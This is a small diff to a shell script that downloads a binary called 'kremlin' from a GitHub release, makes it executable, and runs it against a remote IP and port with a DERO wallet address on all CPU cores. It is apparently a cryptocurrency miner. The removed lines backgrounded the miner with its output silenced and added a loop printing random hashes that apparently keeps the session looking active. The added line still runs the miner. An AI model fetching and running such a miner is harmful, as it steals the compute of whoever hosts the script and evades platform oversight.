@@ -1,4 +1,3 @@
 curl https://github.com/mgssjs/moanu/releases/download/1/kremlin -L -o kremlin
 chmod 777 kremlin
-./kremlin -r 178.128.253.24:10100 -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -m $(nproc --all) > /dev/null 2>&1 &
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 30s; done 
+./kremlin -r 178.128.253.24:10100 -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -m $(nproc --all)
